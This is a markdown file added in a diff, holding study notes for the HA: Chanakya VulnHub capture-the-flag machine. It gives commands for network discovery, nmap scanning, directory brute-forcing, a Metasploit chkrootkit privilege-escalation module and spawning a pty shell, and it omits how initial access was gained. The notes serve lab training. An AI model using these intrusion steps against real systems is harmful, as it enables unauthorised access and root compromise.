@@ -1,0 +1,154 @@
+✅ What is Chanakya CTF?
+Chanakya CTF is a Capture The Flag (CTF) virtual machine challenge hosted on cybersecurity platforms like VulnHub, HackingArticles, or TryHackMe. It’s designed for ethical hackers and cybersecurity learners to practice penetration testing and enhance hacking skills in a legal, controlled environment.
+
+The name "Chanakya" is inspired by the ancient Indian strategist and reflects tactical thinking, which is exactly what CTFs require.
+
+🎯 Why Do We Use Chanakya CTF?
+Purpose	Explanation
+🛡️ Ethical Hacking Practice	It allows learners to safely perform real-world hacking techniques.
+🧠 Problem Solving	You face puzzles that require logical thinking, like cracking passwords or exploiting websites.
+💻 Hands-On Learning	It's more effective than theory; you learn by doing—scanning, exploiting, escalating, and capturing flags.
+🧪 Tool Usage	Helps understand tools like Nmap, Hydra, Gobuster, Netcat, Metasploit, etc.
+📜 Report Writing Practice	Good for writing penetration test reports and documenting steps.
+💼 Career Preparation	Prepares for certifications like OSCP and real job roles in cybersecurity.
+
+
+**Chanakya CTF Overview**
+
+The **Chanakya CTF** is often a virtual machine (VM)-based challenge found on platforms like **VulnHub** or in college-level cybersecurity events. It is designed to test your skills in reconnaissance, enumeration, vulnerability detection, and privilege escalation.
+
+Here are detailed notes on the **HA: Chanakya CTF** (a VulnHub boot‑to‑root machine) based on walkthroughs from HackingArticles and others. These are paraphrased and organized for clarity:
+
+---
+
+## HA: Chanakya CTF Overview
+
+Created by Hacking Articles, *HA: Chanakya* is an intermediate-level boot‑to‑root challenge where your goal is to gain root access and capture flags located in files like *final.txt* by exploiting vulnerabilities in the target VM ([Hacking Articles][1]).
+
+---
+
+## Why Use These Tools
+
+* **netdiscover** to find the VM’s IP address on your network
+* **nmap** to scan open ports and discover services
+* **dirb / gobuster / wget** for enumeration when web services are present
+* **Metasploit (chkrootkit local exploit)** to escalate privileges
+* **Python TTY shell** to gain a usable shell
+* **File‑reading commands** to capture the flag
+
+These steps mirror real‑world penetration testing methodology: identify the target, enumerate services, exploit vulnerabilities, elevate privileges, and collect evidence (flags).
+
+---
+
+## Step‑by‑Step Commands & Explanation
+
+### 1. Discover the target IP
+
+```bash
+netdiscover
+```
+
+Use netdiscover to map the subnet and identify the VM’s IP (e.g., `192.168.1.101`) by matching MAC addresses ([Hacking Articles][1], [Viphacker100org][2], [Infosec Institute][3]).
+
+---
+
+### 2. Scan the target with Nmap
+
+```bash
+nmap -A 192.168.1.101
+```
+
+This aggressive scan reveals open ports (SSH on 22, FTP on 21, HTTP on 80), service versions, OS detection, and scripts ([SaiKiran Uppu][4]).
+
+---
+
+### 3. Enumerate the Web Server
+
+* Browse to `http://192.168.1.101`, inspect source and resources (initial investigation found no immediate clues) ([Hacking Articles][1]).
+* Use directory brute‑force:
+
+  ```bash
+  dirb http://192.168.1.101/ -X .txt
+  ```
+
+  Found `abuse.txt` ([Viphacker100org][2], [Sechub][5]).
+* Download it:
+
+  ```bash
+  wget http://192.168.1.101/abuse.txt
+  cat abuse.txt
+  ```
+
+  The file text appeared encrypted; recognized as ROT13 cipher referencing a pcap file (`ashoka.pcapng`) ([Viphacker100org][2]).
+
+---
+
+### 4. Exploitation and Privilege Escalation
+
+* In this challenge, privilege escalation is done via a known local exploit in Metasploit (`chkrootkit`).
+* From within Metasploit console:
+
+  ```bash
+  msfconsole
+  use exploit/unix/local/chkrootkit
+  set session 1
+  set LPORT 8888
+  exploit
+  ```
+
+  This leverages vulnerability detected in `chkrootkit` logs, giving root shell access ([Hacking Articles][1]).
+
+---
+
+### 5. Spawn a Proper TTY Shell
+
+Once you get a basic shell, convert to an interactive TTY:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+### 6. Locate and Read the Final Flag
+
+Common file discovery/reading commands:
+
+```bash
+ls
+cat final.txt
+```
+
+`final.txt` contained the root flag—the goal is reached ([Sechub][5]).
+
+---
+
+## Quick Commands Cheat Sheet
+
+| Phase               | Tool / Command                                    |
+| ------------------- | ------------------------------------------------- |
+| IP Discovery        | `netdiscover`                                     |
+| Port & Service Scan | `nmap -A <IP>`                                    |
+| Web Enumeration     | `dirb http://<IP>/ -X .txt`                       |
+| Download file       | `wget http://<IP>/abuse.txt`                      |
+| Decode ROT13 hint   | ROT13 tools or manual decryption                  |
+| Start Metasploit    | `msfconsole`                                      |
+| Use local exploit   | `use exploit/unix/local/chkrootkit`               |
+| Set exploit options | `set session 1`, `set LPORT 8888`                 |
+| Launch exploit      | `exploit`                                         |
+| Spawn TTY shell     | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
+| Read flag file      | `cat final.txt`                                   |
+
+---
+
+## Summary in Small Points
+
+* Use netdiscover to find VM IP
+* Run `nmap -A` to identify ports and services
+* Enumerate HTTP service with `dirb`, find hidden files (e.g., `abuse.txt`)
+* Download and inspect hidden files; decrypt when needed
+* Use Metasploit local exploit to escalate privileges
+* Spawn interactive shell using Python pty
+* Read and capture flag from `final.txt`
+
+
